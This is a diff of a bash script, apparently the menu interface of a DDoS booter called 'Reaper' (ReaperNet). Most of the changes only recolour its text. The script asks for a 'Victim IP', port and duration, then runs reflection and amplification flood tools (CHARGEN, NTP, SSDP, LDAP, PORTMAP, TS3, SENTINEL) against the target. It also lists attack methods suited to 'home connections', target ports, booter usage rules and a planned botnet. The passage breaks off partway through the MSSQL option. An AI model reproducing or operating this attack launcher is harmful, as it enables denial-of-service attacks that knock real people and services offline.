@@ -26,47 +26,48 @@ LIGHTPINK='\e[38;5;207m'
 YELLOW='\e[38;5;11m' 
 LIGHTYELLOW='\e[38;5;226m' 
 WHITE='\e[38;5;231m'
+BOLDWHITE='\e[1;37m'
 ORANGE='\e[38;5;208m'  
 clear 
 tput civis 
 who am i >> logs.txt 
-echo -n -e "${BRIGHTGREEN}Loading the Reaper :)\r" 
+echo -n -e "${BOLDWHITE}Loading the Reaper :)\r" 
 sleep 2 
-echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}# ${WHITE}(5%)\r" 
+echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}# ${BOLDWHITE}(5%)\r" 
 sleep 1 
-echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}### ${WHITE}(10%)\r" 
+echo -n -e "${BOLDWHITE}Loading Files.. ${BOLDWHITE}[${PINK}### ${BOLDWHITE}(10%)\r" 
 sleep 1 
-echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}######## ${WHITE}(25%)\r"
+echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}######## ${BOLDWHITE}(25%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}################## ${WHITE}(40%)\r"
+echo -n -e "${BOLDWHITE}Loading Files.. ${BOLDWHITE}[${PINK}################## ${BOLDWHITE}(40%)\r"
 sleep 1
-echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}############################## ${WHITE}(65%)\r"
+echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}############################## ${BOLDWHITE}(65%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}#################################### ${WHITE}(80%)\r"
+echo -n -e "${BOLDWHITE}Loading Files.. ${BOLDWHITE}[${PINK}#################################### ${BOLDWHITE}(80%)\r"
 sleep 1
-echo -n -e "${PINK}Loading Files.. ${WHITE}[${BRIGHTGREEN}######################################### ${WHITE}(95%)\r"
+echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}######################################### ${BOLDWHITE}(95%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Loading Files.. ${WHITE}[${PINK}#############################################${WHITE}] (100%) ${BRIGHTGREEN}Finished" 
+echo -n -e "${BOLDWHITE}Loading Files.. ${BOLDWHITE}[${PINK}#############################################${WHITE}] (100%) ${BOLDWHITE}Finished" 
 sleep 2
 echo -ne '\n'
-echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}# ${WHITE}(5%)\r"
+echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}# ${BOLDWHITE}(5%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#####${WHITE}(23%)\r"
+echo -n -e "${BOLDWHITE}Detecting IP Address... ${BOLDWHITE}[${PINK}#####${BOLDWHITE}(23%)\r"
 sleep 1
-echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}###########${WHITE}(39%)\r"
+echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}###########${BOLDWHITE}(39%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}###############${WHITE}(55%)\r"
+echo -n -e "${BOLDWHITE}Detecting IP Address... ${BOLDWHITE}[${PINK}###############${BOLDWHITE}(55%)\r"
 sleep 1
-echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}####################${WHITE}(71%)\r"
+echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}####################${BOLDWHITE}(71%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#########################${WHITE}(77%)\r"
+echo -n -e "${BOLDWHITE}Detecting IP Address... ${BOLDWHITE}[${PINK}#########################${BOLDWHITE}(77%)\r"
 sleep 2
-echo -n -e "${PINK}Detecting IP Address... ${WHITE}[${BRIGHTGREEN}###################################${WHITE}(95%)\r"
+echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}###################################${BOLDWHITE}(95%)\r"
 sleep 1
-echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${WHITE}[${PINK}#############################################${WHITE}] (100%) ${BRIGHTGREEN}Finished"
+echo -n -e "${BOLDWHITE}Detecting IP Address... ${BOLDWHITE}[${PINK}#############################################${BOLDWHITE}] (100%) ${PINK}Finished"
 sleep 2
 echo -ne '\n'
-echo -n -e "${WHITE}WELCOME TO THE ${BRIGHTGREEN}REA${PINK}PER${WHITE}!"
+echo -n -e "${BOLDWHITE}WELCOME TO THE ${PINK}REA${BOLDWHITE}PER${PINK}!"
 sleep 5
 echo -ne '\n' 
 tput cnorm 
@@ -74,20 +75,20 @@ while true
 do 
 clear 
 echo -e "
-          ${BRIGHTGREEN}8888888b 
-          ${BRIGHTGREEN}888   Y88b 
-          ${BRIGHTGREEN}888    888 
-          ${BRIGHTGREEN}888   d88P .d88b.   8888b.   88888b.   .d88b.  888d888
-          ${BRIGHTGREEN}8888888b  d8P  Y8b      88b  888  88b d8P  Y8b 888P
-          ${BRIGHTGREEN}888 T88b  88888888 .d888888  888  888 88888888 888
-          ${PINK}888  T88b Y8b.     888  888  888 d88P Y8b.     888
-          ${PINK}888   T88b  Y8888   Y888888  88888P     Y8888  888
-                                       ${PINK}888
-                                       ${PINK}888
-                                       ${PINK}888
+          ${PINK}8888888b 
+          ${PINK}888   Y88b 
+          ${PINK}888    888 
+          ${PINK}888   d88P .d88b.   8888b.   ${BOLDWHITE}88888b.   .d88b.  888d888
+          ${PINK}8888888b  d8P  Y8b      88b  ${BOLDWHITE}888  88b d8P  Y8b 888P
+          ${PINK}888 T88b  88888888 .d888888  ${BOLDWHITE}888  888 88888888 888
+          ${PINK}888  T88b Y8b.     888  888  ${BOLDWHITE}888 d88P Y8b.     888
+          ${PINK}888   T88b  Y8888   Y888888  ${BOLDWHITE}88888P     Y8888  888
+                                       ${BOLDWHITE}888
+                                       ${BOLDWHITE}888
+                                       ${BOLDWHITE}888
 
-              ${BRIGHTGREEN}**********************************************
-              ${WHITE}*                ${PINK}@${BRIGHTGREEN}VEXVAIN${WHITE}#0578               ${WHITE}*
+              ${BOLDWHITE}**********************************************
+              ${WHITE}*                ${PINK}@${BOLDWHITE}VEXVAIN${WHITE}#0578               ${WHITE}*
               ${PINK}**********************************************
 
 " 
@@ -98,116 +99,116 @@ echo -e " "
 echo -e " " 
 echo -e " " 
 echo -e " " 
-echo -e "${WHITE}[${PINK}root${WHITE}@${BRIGHTGREEN}Reaper${PINK}~${WHITE}]${BRIGHTGREEN}#${BRIGHTGREEN} \c" 
+echo -e "${PINK}root${BOLDWHITE}@${PINK}Reaper${BOLDWHITE}:${PINK}~${BOLDWHITE}#${BOLDWHITE} \c" 
 read answer 
 if [[ $answer == HELP ]] 
 then 
 clear 
 echo -e "" 
 echo -e "${PINK}Select An Option:" 
-echo -e "${WHITE}[${LIGHTRED}HELP${WHITE}] -${WHITE}Shows Attack Methods" 
-echo -e "${WHITE}[${LIGHTYELLOW}RULES${WHITE}] -${WHITE}Shows the T.O.S of ReaperNet" 
-echo -e "${WHITE}[${LIGHTBLUE}PORTS${WHITE}] -${WHITE}Shows Usable Ports" 
-echo -e "${WHITE}[${LIGHTMAGENTA}STRESS${WHITE}] -${WHITE}Shows Boot Tutorial" 
-echo -e "${WHITE}[${LIGHTCYAN}EXTRA${WHITE}] -${WHITE}Shows Something For Newbies" 
-echo -e "${WHITE}[${LIGHTPINK}ADMINS${WHITE}] -${WHITE}Shows Users With Administrator Access" 
-echo -e "${WHITE}[${ORANGE}CONTACTS${WHITE}] -${WHITE}Shows Admin Contact Info" 
-echo -e "${WHITE}[${LIGHTGREEN}BOTNET${WHITE}] -${WHITE}Coming Soon :)" 
+echo -e "${BOLDWHITE}[${LIGHTRED}HELP${BOLDWHITE}] -${BOLDWHITE}Shows Attack Methods" 
+echo -e "${BOLDWHITE}[${LIGHTYELLOW}RULES${BOLDWHITE}] -${BOLDWHITE}Shows the T.O.S of ReaperNet" 
+echo -e "${BOLDWHITE}[${LIGHTBLUE}PORTS${BOLDWHITE}] -${BOLDWHITE}Shows Usable Ports" 
+echo -e "${BOLDWHITE}[${LIGHTMAGENTA}STRESS${BOLDWHITE}] -${BOLDWHITE}Shows Boot Tutorial" 
+echo -e "${BOLDWHITE}[${LIGHTCYAN}EXTRA${BOLDWHITE}] -${BOLDWHITE}Shows Something For Newbies" 
+echo -e "${BOLDWHITE}[${LIGHTPINK}ADMINS${BOLDWHITE}] -${BOLDWHITE}Shows Users With Administrator Access" 
+echo -e "${BOLDWHITE}[${ORANGE}CONTACTS${BOLDWHITE}] -${BOLDWHITE}Shows Admin Contact Info" 
+echo -e "${BOLDWHITE}[${LIGHTGREEN}BOTNET${BOLDWHITE}] -${BOLDWHITE}Coming Soon :)" 
 read
 fi 
 if [[ $answer == RULES ]] 
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}RULES ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Rapid Booting ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Sharing Users ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Going Over Time ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}No Using Scanner Commands ${WHITE}[${PINK}+${WHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}RULES ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Rapid Booting ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Sharing Users ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Going Over Time ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Using Scanner Commands ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
 read
 fi 
 if [[ $answer == STRESS ]] 
 then 
 clear 
 echo -e "${PINK} /-----------------------------------------------------------\ " 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}LDAP  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} |" 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}SSDP  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}TS3  ${WHITE}Protocol:${LIGHTMAGENTA}TCP  ${WHITE}Good For: ${BRIGHTGREEN}Teamspeak Servers${PINK} | " 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}CHARGEN  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}NTP  ${WHITE}Protocol:${BRIGHTGREEN}TCP  ${WHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}PORTMAP  ${WHITE}Protocol:${BRIGHTGREEN}TCP  ${WHITE}Good For: ${BRIGHTGREEN}OVHs And Hotspots${PINK} |" 
-echo -e "${PINK} | ${WHITE}Method:${BRIGHTGREEN}MSSQL  ${WHITE}Protocol:${BRIGHTGREEN}UDP  ${WHITE}Good For: ${BRIGHTGREEN}High End Servers ${PINK} | " 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}LDAP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} |" 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}SSDP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}TS3  ${BOLDWHITE}Protocol:${LIGHTMAGENTA}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Teamspeak Servers${PINK} | " 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}CHARGEN  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}NTP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}PORTMAP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}OVHs And Hotspots${PINK} |" 
+echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}MSSQL  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}High End Servers ${PINK} | " 
 echo -e "${PINK} \-----------------------------------------------------------/ " 
 read 
 fi 
 if [[ $answer == PORTS ]] 
 then 
 clear 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}PORTS ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}22 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}23 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}53 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}80 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}443 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}1723 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}3074 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}8080 ${WHITE}[${PINK}+${WHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}PORTS ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}22 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}23 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}53 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}80 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}443 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}1723 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}3074 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}8080 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
 read 
 fi 
 if [[ $answer == EXTRA ]] 
 then 
 clear 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}EXTRA$ ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}UwU ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Max time 1000 ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Don't spam 1000 ${WHITE}[${PINK}+${WHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}EXTRA$ ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}UwU ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Max time 1000 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Don't spam 1000 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
 read 
 fi 
 if [[ $answer == ADMINS ]] 
 then 
 clear 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${PINK}ADMINS ${WHITE}[${PINK}+${WHITE}]" 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Vexvain ${WHITE}[${PINK}+${WHITE}]"  
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}ADMINS ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Vexvain ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"  
 read 
 fi 
 if [[ $answer == CONTACTS ]] 
 then 
 clear  
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}Vexvain#0578 ${WHITE}[${PINK}+${WHITE}]" 
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Vexvain#0578 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
 read 
 fi 
 if [[ $answer == BOTNET ]] 
 then 
 clear 
-echo -e "${WHITE}[${PINK}+${WHITE}] ${BRIGHTGREEN}COMING SOON! ${WHITE}[${PINK}+${WHITE}]" 
-echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]" 
-echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]"
-echo -e          "${WHITE}[${PINK}+${WHITE}] >${BRIGHTRED}REDACTED${WHITE}< ${WHITE}[${PINK}+${WHITE}]"
+echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}COMING SOON! ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
+echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"
+echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"
 read 
 fi 
 if [[ $answer == CHARGEN ]] 
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} IP:${PINK}$ip " 
+echo -e "${BOLDWHITE} IP:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} Port:${PINK}$port " 
+echo -e "${BOLDWHITE} Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} Time:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} Time:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./chargen $ip $port chargen.txt 1 -1 $time 
 fi 
@@ -215,25 +216,25 @@ if [[ $answer == TS3 ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip " 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./ts3 $ip $port ts3.txt 1 -1 $time 
 fi 
@@ -241,25 +242,25 @@ if [[ $answer == NTP ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip " 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./ntp $ip $port ntp.txt 1 -1 $time 
 fi 
@@ -267,25 +268,25 @@ if [[ $answer == SSDP ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip " 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./ssdp $ip $port ssdp.txt 1 -1 $time 
 fi 
@@ -293,25 +294,25 @@ if [[ $answer == SENTINEL ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip " 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./sentinel $ip $port sentinel.txt 1 -1 $time 
 fi 
@@ -319,25 +320,25 @@ if [[ $answer == LDAP ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip " 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./ldap $ip $port ldap.txt 1 -1 $time 
 fi 
@@ -345,25 +346,25 @@ if [[ $answer == PORTMAP ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
 read time 
 clear 
 echo -e "" 
-echo -e "${WHITE} Hitting:${PINK}$ip" 
+echo -e "${BOLDWHITE} Hitting:${PINK}$ip" 
 echo -e " " 
-echo -e "${WHITE} On Port:${PINK}$port " 
+echo -e "${BOLDWHITE} On Port:${PINK}$port " 
 echo -e " " 
-echo -e "${WHITE} For:${PINK}$time ${WHITE}Seconds" 
+echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
 echo -e "" 
-echo -e "${WHITE} Starting!" 
+echo -e "${BOLDWHITE} Starting!" 
 echo -e "" 
 ./portmap $ip $port portmap.txt 1 -1 $time 
 fi 
@@ -371,25 +372,25 @@ if [[ $answer == MSSQL ]]
 then 
 clear 
 echo -e "" 
-echo -e "${WHITE} Victim IP:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
 read ip 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired port:${BRIGHTGREEN} \c" 
+echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
 read port 
 clear 
 echo -e "" 
-echo -e "${WHITE} Desired Time:${BRIGHTGREEN} \c" 
